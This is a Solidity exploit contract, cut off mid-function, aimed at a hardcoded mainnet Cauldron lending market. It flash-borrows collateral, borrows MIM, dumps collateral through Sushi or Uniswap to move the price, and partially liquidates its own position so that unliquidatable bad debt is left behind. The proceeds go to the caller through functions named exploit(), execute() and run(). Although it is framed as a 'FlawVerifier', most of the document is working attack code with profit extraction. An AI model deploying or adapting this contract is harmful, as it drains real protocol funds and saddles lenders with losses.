// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata data) external;
}

struct RebaseLike {
    uint128 elastic;
    uint128 base;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function totals(address token) external view returns (RebaseLike memory totals_);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
}

interface ICauldronV4Like {
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function liquidate(
        address[] memory users,
        uint256[] memory maxBorrowParts,
        address to,
        address swapper,
        bytes memory swapperData
    ) external;
    function bentoBox() external view returns (address);
    function collateral() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function isSolvent(address user) external view returns (bool);
    function addCollateral(address to, bool skim, uint256 share) external;
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function COLLATERIZATION_RATE() external view returns (uint256);
    function LIQUIDATION_MULTIPLIER() external view returns (uint256);
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract FlawVerifier is IFlashBorrowerLike {
    uint256 internal constant BPS = 10_000;
    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint256 internal constant COLLATERIZATION_RATE_PRECISION = 1e5;
    uint256 internal constant EXCHANGE_RATE_PRECISION = 1e18;
    uint256 internal constant LIQUIDATION_MULTIPLIER_PRECISION = 1e5;

    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_UPDATE_EXCHANGE_RATE = 11;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    ICauldronV4Like public constant TARGET = ICauldronV4Like(TARGET_CAULDRON);

    error ConcretePreconditionFailed(string reason);
    error FlashLoanCallerMismatch(address expected, address actual);
    error FlashLoanSenderMismatch(address expected, address actual);
    error FlashLoanTokenMismatch(address expected, address actual);
    error ProbeBorrowSucceeded(uint256 part, uint256 share);
    error ProbeLiquidationSucceeded();

    address public collateralToken;
    address public underlyingToken;
    address public convexDepositToken;
    address public curveLpToken;
    address public curvePool;
    address public quoteAsset;
    address public dumpRouter;
    address public lastProfitToken;

    string public constant PATH_2_SUBTRACTION_ANCHOR = "userCollateralShare[user].sub(collateralShare)";
    string public constant PATH_2_OVERFLOW_ANCHOR = "collateralShare > userCollateralShare[user]";

    uint256 public flashAmount;
    uint256 public flashFee;
    uint256 public depositedAmount;
    uint256 public depositedShare;
    uint256 public borrowedAmount;
    uint256 public borrowedPart;
    uint256 public borrowedShare;
    uint256 public exchangeRateBefore;
    uint256 public exchangeRateAfterDump;
    uint256 public safePartialBorrowPart;
    uint256 public remainingBorrowPart;
    uint256 public remainingCollateralShare;
    uint256 public requiredCollateralShareForRemainingDebt;
    uint256 public requiredCollateralShareForFullDebtAfterDump;
    uint256 public profitAmount;

    bool public positionCreated;
    bool public dumpedForPriceImpact;
    bool public insolventAfterDump;
    bool public partialLiquidationExecuted;
    bool public finalLiquidationReverted;
    bool public residualDebtIsUnderwater;
    bool public badDebtLocked;

    bytes public finalLiquidationRevertData;
    bytes public lastAttemptRevertData;

    uint16 internal strategyDepositBps;
    address internal strategyQuote;
    address internal strategyRouter;

    constructor() {
        lastProfitToken = MIM;
    }

    receive() external payable {}

    function executeOnOpportunity() external returns (uint256) {
        return _executeTo(msg.sender);
    }

    function execute() external returns (uint256) {
        return _executeTo(msg.sender);
    }

    function run() external returns (uint256) {
        return _executeTo(msg.sender);
    }

    function exploit() external returns (uint256) {
        return _executeTo(msg.sender);
    }

    function executeTo(address recipient) external returns (uint256) {
        return _executeTo(recipient);
    }

    function executeWithFlashAmount(uint256 amount) external returns (uint256) {
        _prepare();
        uint256 realized = _executeAmountSearch(amount);
        _payout(recipientOrSender(address(0)), realized);
        return realized;
    }

    function executeStrategy(uint256 amount, uint16 depositBps, address router, address quote)
        external
        returns (uint256)
    {
        _prepare();
        _resetAttemptState();

        if (amount == 0) revert ConcretePreconditionFailed("ZERO_FLASH_AMOUNT");
        if (depositBps == 0 || depositBps >= BPS) revert ConcretePreconditionFailed("BAD_DEPOSIT_BPS");
        if (router != SUSHI_ROUTER && router != UNISWAP_V2_ROUTER) revert ConcretePreconditionFailed("BAD_ROUTER");
        if (quote == address(0) || quote == collateralToken) revert ConcretePreconditionFailed("BAD_QUOTE");

        strategyDepositBps = depositBps;
        strategyRouter = router;
        strategyQuote = quote;

        exchangeRateBefore = TARGET.exchangeRate();
        if (exchangeRateBefore == 0) revert ConcretePreconditionFailed("ZERO_EXCHANGE_RATE");

        IBentoBoxLike(TARGET.bentoBox()).flashLoan(this, address(this), collateralToken, amount, bytes(""));

        if (!badDebtLocked) revert ConcretePreconditionFailed("PATH_INFEASIBLE_AT_FORK");
        return profitAmount;
    }

    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata)
        external
        override
    {
        address bento = TARGET.bentoBox();
        if (msg.sender != bento) revert FlashLoanCallerMismatch(bento, msg.sender);
        if (sender != address(this)) revert FlashLoanSenderMismatch(address(this), sender);
        if (address(token) != collateralToken) revert FlashLoanTokenMismatch(collateralToken, address(token));

        flashAmount = amount;
        flashFee = fee;

        uint256 initialDepositAmount = (amount * strategyDepositBps) / BPS;
        if (initialDepositAmount == 0 || initialDepositAmount >= amount) {
            revert ConcretePreconditionFailed("DEPOSIT_SPLIT_INVALID");
        }

        _forceApprove(collateralToken, bento, initialDepositAmount);
        (depositedAmount, depositedShare) =
            IBentoBoxLike(bento).deposit(collateralToken, address(this), TARGET_CAULDRON, initialDepositAmount, 0);
        if (depositedShare == 0 || depositedAmount == 0) revert ConcretePreconditionFailed("ZERO_DEPOSIT_SHARE");

        TARGET.addCollateral(address(this), true, depositedShare);
        if (TARGET.userCollateralShare(address(this)) == 0) revert ConcretePreconditionFailed("ADD_COLLATERAL_FAILED");
        positionCreated = true;

        borrowedAmount = _determineBorrowAmount();
        if (borrowedAmount == 0) revert ConcretePreconditionFailed("NO_BORROWABLE_MIM");
        (borrowedPart, borrowedShare) = _borrowViaCook(borrowedAmount);
        if (borrowedPart == 0 || TARGET.userBorrowPart(address(this)) == 0) {
            revert ConcretePreconditionFailed("BORROW_FAILED");
        }

        _withdrawAllTokenFromBento(MIM);
        _dumpForPriceImpact(amount - depositedAmount);
        dumpedForPriceImpact = true;

        try TARGET.updateExchangeRate() returns (bool, uint256 rate) {
            exchangeRateAfterDump = rate;
        } catch {
            exchangeRateAfterDump = TARGET.exchangeRate();
        }
        if (exchangeRateAfterDump == 0) revert ConcretePreconditionFailed("ZERO_POST_DUMP_RATE");

        insolventAfterDump = !TARGET.isSolvent(address(this));
        if (!insolventAfterDump) revert ConcretePreconditionFailed("NOT_INSOLVENT_AFTER_DUMP");

        requiredCollateralShareForFullDebtAfterDump =
            _requiredCollateralShareForPart(TARGET.userBorrowPart(address(this)), exchangeRateAfterDump);
        if (requiredCollateralShareForFullDebtAfterDump <= TARGET.userCollateralShare(address(this))) {
            revert ConcretePreconditionFailed("FULL_LIQUIDATION_STILL_COVERED");
        }

        safePartialBorrowPart = _findSafePartialBorrowPart();
        if (safePartialBorrowPart == 0) revert ConcretePreconditionFailed("NO_SAFE_PARTIAL_LIQUIDATION");
        if (safePartialBorrowPart >= TARGET.userBorrowPart(address(this))) {
            revert ConcretePreconditionFailed("PARTIAL_EQUALS_FULL");
        }

        _depositAllMimIntoBento();
        _liquidate(safePartialBorrowPart);
        partialLiquidationExecuted = true;

        remainingBorrowPart = TARGET.userBorrowPart(address(this));
        remainingCollateralShare = TARGET.userCollateralShare(address(this));
        if (remainingBorrowPart == 0) revert ConcretePreconditionFailed("NO_REMAINING_DEBT");
        if (TARGET.isSolvent(address(this))) revert ConcretePreconditionFailed("PARTIAL_RESTORES_SOLVENCY");

        requiredCollateralShareForRemainingDebt =
            _requiredCollateralShareForPart(remainingBorrowPart, exchangeRateAfterDump);
        residualDebtIsUnderwater = requiredCollateralShareForRemainingDebt > remainingCollateralShare;
        if (!residualDebtIsUnderwater) {
            revert ConcretePreconditionFailed("RESIDUAL_DEBT_NOT_UNDERWATER_ENOUGH");
        }

        _withdrawAllTokenFromBento(MIM);
        if (IERC20Like(MIM).balanceOf(address(this)) < _estimateBorrowAmount(remainingBorrowPart)) {
            revert ConcretePreconditionFailed("NOT_ENOUGH_MIM_TO_TEST_FINAL_LIQUIDATION");
        }

        try this.attemptFinalLiquidation() {
            revert ConcretePreconditionFailed("FINAL_LIQUIDATION_SUCCEEDED");
        } catch (bytes memory reason) {
            finalLiquidationReverted = true;
            finalLiquidationRevertData = reason;
        }

        badDebtLocked = partialLiquidationExecuted && finalLiquidationReverted && residualDebtIsUnderwater;
        if (!badDebtLocked) revert ConcretePreconditionFailed("BUG_NOT_CONFIRMED");

        uint256 repayAmount = amount + fee - depositedAmount;
        if (IERC20Like(collateralToken).balanceOf(address(this)) < repayAmount) {
            _swapSomeMimForCollateral(repayAmount - IERC20Like(collateralToken).balanceOf(address(this)));
        }
        if (IERC20Like(collateralToken).balanceOf(address(this)) < repayAmount) {
            revert ConcretePreconditionFailed("INSUFFICIENT_COLLATERAL_FOR_FLASH_REPAY");
        }

        _safeTransfer(collateralToken, bento, repayAmount);
        _swapAllToMim(underlyingToken);
        _swapAllToMim(convexDepositToken);
        _swapAllToMim(curveLpToken);
        profitAmount = IERC20Like(MIM).balanceOf(address(this));
        lastProfitToken = MIM;
    }

    function probeBorrow(uint256 amount) external {
        if (msg.sender != address(this)) revert ConcretePreconditionFailed("SELF_CALL_ONLY");
        (uint256 part, uint256 share) = _borrowViaCook(amount);
        revert ProbeBorrowSucceeded(part, share);
    }

    function probeLiquidation(uint256 part) external {
        if (msg.sender != address(this)) revert ConcretePreconditionFailed("SELF_CALL_ONLY");
        _depositAllMimIntoBento();
        _liquidate(part);
        revert ProbeLiquidationSucceeded();
    }

    function attemptFinalLiquidation() external {
        if (msg.sender != address(this)) revert ConcretePreconditionFailed("SELF_CALL_ONLY");
        _depositAllMimIntoBento();
        _liquidate(remainingBorrowPart);
    }

    function bugConfirmed() external view returns (bool) {
        return badDebtLocked;
    }

    function hypothesisValidated() external view returns (bool) {
        return badDebtLocked;
    }

    function dumpAsset() external view returns (address) {
        return quoteAsset;
    }

    function fullLiquidationShareNeeded() external view returns (uint256) {
        return requiredCollateralShareForFullDebtAfterDump;
    }

    function previewCollateralToken() external view returns (address) {
        return collateralToken == address(0) ? TARGET.collateral() : collateralToken;
    }

    function previewFlashAmount() external view returns (uint256) {
        address token = collateralToken == address(0) ? TARGET.collateral() : collateralToken;
        if (token == address(0)) return 0;
        return IERC20Like(token).balanceOf(TARGET.bentoBox());
    }

    function previewBorrowAmount() external view returns (uint256) {
        return borrowedAmount;
    }

    function previewProfitToken() external pure returns (address) {
        return MIM;
    }

    function lastBorrowAmount() external view returns (uint256) {
        return borrowedAmount;
    }

    function lastBorrowPart() external view returns (uint256) {
        return borrowedPart;
    }

    function lastProfitAmount() external view returns (uint256) {
        return profitAmount;
    }

    function sweep(address token, address to) external returns (uint256 amount) {
        amount = IERC20Like(token).balanceOf(address(this));
        if (amount != 0) _safeTransfer(token, to, amount);
    }

    function _executeTo(address recipient) internal returns (uint256 realized) {
        _prepare();
        realized = _executeSearch();
        _payout(recipientOrSender(recipient), realized);
    }

    function recipientOrSender(address recipient) internal view returns (address) {
        return recipient == address(0) ? msg.sender : recipient;
    }

    function _payout(address recipient, uint256 realized) internal {
        uint256 mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance > realized) realized = mimBalance;
        profitAmount = realized;
        lastProfitToken = MIM;
        if (mimBalance != 0 && recipient != address(0) && recipient != address(this)) {
            _safeTransfer(MIM, recipient, mimBalance);
        }
    }

    function _executeSearch() internal returns (uint256 bestProfit) {
        uint256 idle = IERC20Like(collateralToken).balanceOf(TARGET.bentoBox());
        if (idle == 0) return 0;

        uint256[5] memory amounts = [idle, idle / 2, idle / 4, idle / 10, idle / 20];
        for (uint256 i = 0; i < amounts.length; i++) {
            uint256 amount = amounts[i];
            if (amount == 0) continue;
            uint256 profit = _executeAmountSearch(amount);
            if (profit > bestProfit) bestProfit = profit;
            if (badDebtLocked) return profit;
        }
    }

    function _executeAmountSearch(uint256 amount) internal returns (uint256 bestProfit) {
        uint16[5] memory depositBpses = [uint16(9900), 9750, 9500, 9000, 8000];
        address[5] memory quotes = [MIM, WETH, USDC, DAI, USDT];
        address[2] memory routers = [SUSHI_ROUTER, UNISWAP_V2_ROUTER];

        for (uint256 i = 0; i < depositBpses.length; i++) {
            uint16 depositBps = depositBpses[i];
            if ((amount * depositBps) / BPS == 0) continue;
            if (amount - ((amount * depositBps) / BPS) == 0) continue;

            for (uint256 j = 0; j < routers.length; j++) {
                for (uint256 k = 0; k < quotes.length; k++) {
                    address quote = quotes[k];
                    if (quote == address(0) || quote == collateralToken) continue;
                    try this.executeStrategy(amount, depositBps, routers[j], quote) returns (uint256 profit) {
                        if (profit > bestProfit) bestProfit = profit;
                        if (badDebtLocked) return profit;
                    } catch (bytes memory reason) {
                        lastAttemptRevertData = reason;
                    }
                }
            }
        }
    }

    function _prepare() internal {
        if (collateralToken != address(0)) return;
        collateralToken = TARGET.collateral();

        convexDepositToken = _probeAsset(collateralToken);
        if (convexDepositToken == address(0)) convexDepositToken = collateralToken;

        curveLpToken = _probeCurveLp(convexDepositToken);
        if (curveLpToken == address(0)) curveLpToken = _probeCurveLp(collateralToken);
        if (curveLpToken == address(0)) curveLpToken = convexDepositToken;

        curvePool = _probeCurvePool(curveLpToken);
        underlyingToken = _preferredDumpToken();
        if (underlyingToken == address(0)) underlyingToken = collateralToken;
    }

    function _resetAttemptState() internal {
        quoteAsset = address(0);
        dumpRouter = address(0);
        flashAmount = 0;
        flashFee = 0;
        depositedAmount = 0;
        depositedShare = 0;
        borrowedAmount = 0;
        borrowedPart = 0;
        borrowedShare = 0;
        exchangeRateBefore = 0;
        exchangeRateAfterDump = 0;
        safePartialBorrowPart = 0;
        remainingBorrowPart = 0;
        remainingCollateralShare = 0;
        requiredCollateralShareForRemainingDebt = 0;
        requiredCollateralShareForFullDebtAfterDump = 0;
        profitAmount = 0;
        positionCreated = false;
        dumpedForPriceImpact = false;
        insolventAfterDump = false;
        partialLiquidationExecuted = false;
        finalLiquidationReverted = false;
        residualDebtIsUnderwater = false;
        badDebtLocked = false;
        delete finalLiquidationRevertData;
        delete lastAttemptRevertData;
    }

    function _determineBorrowAmount() internal returns (uint256 amount) {
        uint256 capLimited = _maxBorrowableAmountByCaps();
        if (capLimited == 0) return 0;

        uint256 collateralLimited = _maxBorrowFromCollateral();
        if (collateralLimited == 0) return 0;

        amount = _min(capLimited, collateralLimited);
        uint256 buffered = (amount * 9_900) / BPS;
        if (buffered != 0) amount = buffered;

        if (_probeBorrowSucceeds(amount)) return amount;

        uint256 low = 0;
        uint256 high = amount;
        for (uint256 i = 0; i < 24 && high > low + 1; i++) {
            uint256 mid = (low + high) >> 1;
            if (_probeBorrowSucceeds(mid)) {
                low = mid;
            } else {
                high = mid;
            }
        }
        return low;
    }

    function _borrowViaCook(uint256 amount) internal returns (uint256 part, uint256 share) {
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_UPDATE_EXCHANGE_RATE;
        datas[0] = abi.encode(false, 0, 0);
        actions[1] = ACTION_BORROW;
        datas[1] = abi.encode(int256(amount), address(this));

        (part, share) = TARGET.cook(actions, values, datas);
        if (part == 0 || share == 0) {
            part = TARGET.userBorrowPart(address(this));
            share = IBentoBoxLike(TARGET.bentoBox()).balanceOf(MIM, address(this));
        }
    }

    function _probeBorrowSucceeds(uint256 amount) internal returns (bool ok) {
        if (amount == 0) return false;
        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(this.probeBorrow.selector, amount));
        if (success || data.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(data, 32))
        }
        return selector == ProbeBorrowSucceeded.selector;
    }

    function _findSafePartialBorrowPart() internal returns (uint256) {
        uint256 fullPart = TARGET.userBorrowPart(address(this));
        if (fullPart <= 1) return 0;
        if (!_probeLiquidationSucceeds(1)) return 0;

        uint256 low = 1;
        uint256 high = fullPart - 1;
        while (low < high) {
            uint256 mid = (low + high + 1) >> 1;
            if (_probeLiquidationSucceeds(mid)) {
                low = mid;
            } else {
                high = mid - 1;
            }
        }
        return low;
    }

    function _probeLiquidationSucceeds(uint256 part) internal returns (bool) {
        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(this.probeLiquidation.selector, part));
        if (success || data.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(data, 32))
        }
        return selector == ProbeLiquidationSucceeded.selector;
    }

    function _liquidate(uint256 part) internal {
        address[] memory users = new address[](1);
        uint256[] memory parts = new uint256[](1);
        users[0] = address(this);
        parts[0] = part;
        TARGET.liquidate(users, parts, address(this), address(0), bytes(""));
    }

    function _depositAllMimIntoBento() internal {
        uint256 balance = IERC20Like(MIM).balanceOf(address(this));
        if (balance == 0) return;
        _forceApprove(MIM, TARGET.bentoBox(), balance);
        IBentoBoxLike(TARGET.bentoBox()).deposit(MIM, address(this), address(this), balance, 0);
    }

    function _maxBorrowableAmountByCaps() internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 availableAmount = bento.toAmount(MIM, bento.balanceOf(MIM, TARGET_CAULDRON), false);
        if (availableAmount == 0) return 0;

        (uint128 totalCap, uint128 perAddressCap) = TARGET.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = TARGET.totalBorrow();
        uint256 currentPart = TARGET.userBorrowPart(address(this));
        uint256 openingFee = TARGET.BORROW_OPENING_FEE();

        uint256 remainingTotalElastic = totalCap > totalElastic ? uint256(totalCap) - uint256(totalElastic) : 0;
        uint256 remainingPart = perAddressCap > currentPart ? uint256(perAddressCap) - currentPart : 0;
        if (remainingTotalElastic == 0 || remainingPart == 0) return 0;

        uint256 fromTotalCap = (remainingTotalElastic * BORROW_OPENING_FEE_PRECISION)
            / (BORROW_OPENING_FEE_PRECISION + openingFee);

        uint256 maxDebtFromPart = (totalElastic == 0 || totalBase == 0)
            ? remainingPart
            : (remainingPart * uint256(totalElastic)) / uint256(totalBase);
        uint256 fromPartCap = (maxDebtFromPart * BORROW_OPENING_FEE_PRECISION)
            / (BORROW_OPENING_FEE_PRECISION + openingFee);

        amount = _min(availableAmount, _min(fromTotalCap, fromPartCap));
    }

    function _maxBorrowFromCollateral() internal view returns (uint256 amount) {
        uint256 rate = TARGET.exchangeRate();
        if (rate == 0) return 0;

        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 collateralAmount = bento.toAmount(collateralToken, TARGET.userCollateralShare(address(this)), false);
        if (collateralAmount == 0) return 0;

        amount = (collateralAmount * TARGET.COLLATERIZATION_RATE() * EXCHANGE_RATE_PRECISION)
            / COLLATERIZATION_RATE_PRECISION
            / rate;

        uint256 openingFee = TARGET.BORROW_OPENING_FEE();
        amount = (amount * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + openingFee);
    }

    function _dumpForPriceImpact(uint256 spillAmount) internal {
        if (spillAmount == 0) revert ConcretePreconditionFailed("NO_DUMP_BALANCE");
        dumpRouter = strategyRouter;
        quoteAsset = strategyQuote;

        bool dumped;
        if (_swapExactInputPreferred(dumpRouter, collateralToken, quoteAsset, spillAmount)) {
            dumped = _swapAllToMim(quoteAsset);
        }
        if (!dumped) dumped = _dumpThroughUnwraps(spillAmount);
        if (!dumped || IERC20Like(MIM).balanceOf(address(this)) == 0) {
            revert ConcretePreconditionFailed("COLLATERAL_DUMP_SWAP_FAILED");
        }
    }

    function _dumpThroughUnwraps(uint256 amount) internal returns (bool dumped) {
        if (!_unwrapCollateral(amount)) return false;

        address bestToken = _bestDumpInventoryToken();
        if (bestToken == address(0)) return false;

        quoteAsset = bestToken;
        dumped = _swapAllToMim(bestToken);
        if (dumped) return true;

        if (bestToken == curveLpToken || curveLpToken != address(0)) {
            dumped = _dumpCurveLpToMim(curveLpToken);
            if (dumped) {
                quoteAsset = curveLpToken;
                return true;
            }
        }

        if (bestToken != convexDepositToken && convexDepositToken != address(0) && IERC20Like(convexDepositToken).balanceOf(address(this)) != 0) {
            dumped = _swapAllToMim(convexDepositToken);
            if (dumped) {
                quoteAsset = convexDepositToken;
                return true;
            }
        }

        if (bestToken != underlyingToken && underlyingToken != address(0) && IERC20Like(underlyingToken).balanceOf(address(this)) != 0) {
            dumped = _swapAllToMim(underlyingToken);
            if (dumped) {
                quoteAsset = underlyingToken;
                return true;
            }
        }
    }

    function _swapSomeMimForCollateral(uint256 collateralNeeded) internal {
        if (collateralNeeded == 0) return;
        uint256 mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) return;

        if (_swapExactInputPreferred(SUSHI_ROUTER, MIM, collateralToken, mimBalance)) return;
        if (_swapExactInputPreferred(UNISWAP_V2_ROUTER, MIM, collateralToken, IERC20Like(MIM).balanceOf(address(this)))) {
            return;
        }

        if (curveLpToken != address(0) && _buildCollateralFromMimViaCurve(collateralNeeded)) return;

        if (underlyingToken == address(0) || underlyingToken == collateralToken) return;
        mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) return;
        if (_swapExactInputPreferred(SUSHI_ROUTER, MIM, underlyingToken, mimBalance)) {
            _wrapUnderlyingToCollateral();
            return;
        }

        mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) return;
        if (_swapExactInputPreferred(UNISWAP_V2_ROUTER, MIM, underlyingToken, mimBalance)) {
            _wrapUnderlyingToCollateral();
        }
    }

    function _swapAllToMim(address tokenIn) internal returns (bool) {
        if (tokenIn == address(0)) return false;
        if (tokenIn == MIM) return IERC20Like(MIM).balanceOf(address(this)) != 0;
        uint256 amountIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (amountIn == 0) return false;
        if (_swapExactInputPreferred(SUSHI_ROUTER, tokenIn, MIM, amountIn)) return true;
        amountIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (amountIn == 0) return IERC20Like(MIM).balanceOf(address(this)) != 0;
        return _swapExactInputPreferred(UNISWAP_V2_ROUTER, tokenIn, MIM, amountIn);
    }

    function _swapExactInputPreferred(address router, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (bool)
    {
        if (amountIn == 0 || tokenIn == address(0) || tokenOut == address(0) || tokenIn == tokenOut) return false;

        address[] memory direct = _directPath(tokenIn, tokenOut);
        if (_tryExactInputSwap(router, direct, amountIn)) return true;

        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWeth = _wethPath(tokenIn, tokenOut);
            if (_tryExactInputSwap(router, viaWeth, amountIn)) return true;
        }

        if (tokenIn != USDT && tokenOut != USDT) {
            address[] memory viaUsdt = _threeHopPath(tokenIn, USDT, tokenOut);
            if (_tryExactInputSwap(router, viaUsdt, amountIn)) return true;
        }

        address altRouter = router == SUSHI_ROUTER ? UNISWAP_V2_ROUTER : SUSHI_ROUTER;
        if (_tryExactInputSwap(altRouter, direct, amountIn)) return true;
        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWethAlt = _wethPath(tokenIn, tokenOut);
            if (_tryExactInputSwap(altRouter, viaWethAlt, amountIn)) return true;
        }
        if (tokenIn != USDT && tokenOut != USDT) {
            address[] memory viaUsdtAlt = _threeHopPath(tokenIn, USDT, tokenOut);
            if (_tryExactInputSwap(altRouter, viaUsdtAlt, amountIn)) return true;
        }

        return false;
    }

    function _tryExactInputSwap(address router, address[] memory path, uint256 amountIn) internal returns (bool) {
        if (amountIn == 0) return false;
        if (path.length < 2 || path[0] == address(0) || path[path.length - 1] == address(0)) return false;
        if (!_isContract(router) || !_routeExists(router, path)) return false;
        if (IERC20Like(path[0]).balanceOf(address(this)) < amountIn) return false;

        _forceApprove(path[0], router, amountIn);
        try IUniswapV2RouterLike(router).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp)
            returns (uint256[] memory)
        {
            return true;
        } catch {
            return false;
        }
    }

    function _unwrapCollateral(uint256 amount) internal returns (bool) {
        uint256 beforePrimary = _trackedTokenBalance(convexDepositToken);
        uint256 beforeCurveLp = _trackedTokenBalance(curveLpToken);
        uint256 beforeUnderlying = _trackedTokenBalance(underlyingToken);

        if (_attemptUnwrapCollateral(amount)) {
            return _trackedTokenBalance(convexDepositToken) > beforePrimary
                || _trackedTokenBalance(curveLpToken) > beforeCurveLp
                || _trackedTokenBalance(underlyingToken) > beforeUnderlying;
        }
        return false;
    }

    function _attemptUnwrapCollateral(uint256 amount) internal returns (bool) {
        if (amount == 0) return false;
        if (IERC20Like(collateralToken).balanceOf(address(this)) < amount) amount = IERC20Like(collateralToken).balanceOf(address(this));
        if (amount == 0) return false;

        if (_attemptCollateralTransform(abi.encodeWithSignature("withdrawAndUnwrap(uint256,bool)", amount, false))) return true;
        if (_attemptCollateralTransform(abi.encodeWithSignature("withdrawAndUnwrap(uint256)", amount))) return true;
        if (_attemptCollateralTransform(abi.encodeWithSignature("leave(uint256)", amount))) return true;
        if (_attemptCollateralTransform(abi.encodeWithSignature("unwrap(uint256)", amount))) return true;
        if (_attemptCollateralTransform(abi.encodeWithSignature("redeem(uint256,address,address)", amount, address(this), address(this)))) {
            return true;
        }
        if (_attemptCollateralTransform(abi.encodeWithSignature("redeem(uint256,address)", amount, address(this)))) return true;
        if (_attemptCollateralTransform(abi.encodeWithSignature("redeem(uint256)", amount))) return true;
        if (_attemptCollateralTransform(abi.encodeWithSignature("withdraw(uint256,bool)", amount, false))) return true;
        if (_attemptCollateralTransform(abi.encodeWithSignature("withdraw(uint256,address,address)", amount, address(this), address(this)))) {
            return true;
        }
        if (_attemptCollateralTransform(abi.encodeWithSignature("withdraw(uint256,address)", amount, address(this)))) return true;
        if (_attemptCollateralTransform(abi.encodeWithSignature("withdraw(uint256)", amount))) return true;
        return false;
    }

    function _wrapUnderlyingToCollateral() internal returns (bool) {
        if (underlyingToken == address(0) || underlyingToken == collateralToken) return false;
        uint256 underlyingBalance = IERC20Like(underlyingToken).balanceOf(address(this));
        if (underlyingBalance == 0) return false;

        _forceApprove(underlyingToken, collateralToken, underlyingBalance);
        if (_attemptWrapCollateral(abi.encodeWithSignature("enter(uint256)", underlyingBalance))) return true;
        if (_attemptWrapCollateral(abi.encodeWithSignature("wrap(uint256)", underlyingBalance))) return true;
        if (_attemptWrapCollateral(abi.encodeWithSignature("deposit(uint256,address)", underlyingBalance, address(this)))) return true;
        if (_attemptWrapCollateral(abi.encodeWithSignature("deposit(uint256)", underlyingBalance))) return true;
        return false;
    }

    function _attemptCollateralTransform(bytes memory data) internal returns (bool) {
        uint256 beforeCollateral = IERC20Like(collateralToken).balanceOf(address(this));
        uint256 beforePrimary = _trackedTokenBalance(convexDepositToken);
        uint256 beforeCurveLp = _trackedTokenBalance(curveLpToken);
        uint256 beforeUnderlying = _trackedTokenBalance(underlyingToken);
        (bool ok,) = collateralToken.call(data);
        if (!ok) return false;

        return IERC20Like(collateralToken).balanceOf(address(this)) < beforeCollateral
            || _trackedTokenBalance(convexDepositToken) > beforePrimary
            || _trackedTokenBalance(curveLpToken) > beforeCurveLp
            || _trackedTokenBalance(underlyingToken) > beforeUnderlying;
    }

    function _attemptWrapCollateral(bytes memory data) internal returns (bool) {
        uint256 beforeCollateral = IERC20Like(collateralToken).balanceOf(address(this));
        uint256 beforeUnderlying = _trackedTokenBalance(underlyingToken);
        (bool ok,) = collateralToken.call(data);
        if (!ok) return false;
        return IERC20Like(collateralToken).balanceOf(address(this)) > beforeCollateral
            || _trackedTokenBalance(underlyingToken) < beforeUnderlying;
    }

    function _withdrawAllTokenFromBento(address token) internal {
